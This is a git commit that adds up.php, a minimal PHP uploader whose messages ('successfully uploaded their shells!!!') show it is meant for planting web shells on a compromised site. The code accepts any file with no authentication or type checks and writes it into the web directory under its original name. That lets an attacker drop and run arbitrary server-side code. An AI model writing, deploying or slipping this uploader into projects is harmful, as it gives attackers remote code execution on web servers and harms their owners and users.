2ba420a7d8728631ce5572ea120b0295c25ffcc9
mrx325 <rone8989@gmail.com>
2024-07-14 18:10:02 +0200

    Create up.php

---
+++ up.php
@@ -0,0 +1,8 @@
+<?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>successfully uploaded their shells!!!<b><br><br>'; }
+else { echo '<b>Failed to Upload Shell Korang!!!</b><br><br>'; }
+}
+?>
